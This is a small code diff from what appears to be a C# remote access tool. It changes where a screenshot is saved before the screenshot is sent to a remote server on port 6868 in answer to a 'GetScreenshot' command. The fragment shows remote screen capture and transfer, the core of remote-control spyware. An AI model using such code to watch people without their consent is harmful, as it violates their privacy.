@@ -92,11 +92,11 @@ namespace DA_RSA
                         if (cmd == "GetScreenshot")
                         {
                             Bitmap bmp = TakeScreenshot(false);
-                            bmp.Save("C:\\bild.png", ImageFormat.Png);
+                            bmp.Save(Directory.GetCurrentDirectory()+"\\bild.png", ImageFormat.Png);
                             IPEndPoint ipep = (IPEndPoint)server;
                             ipep.Port = 6868;
 
-                            send_data_sync("C:\\bild.png", "bild.png", ipep.Address, ipep.Port);
+                            send_data_sync(Directory.GetCurrentDirectory() + "\\bild.png", "bild.png", ipep.Address, ipep.Port);
 
                             
 
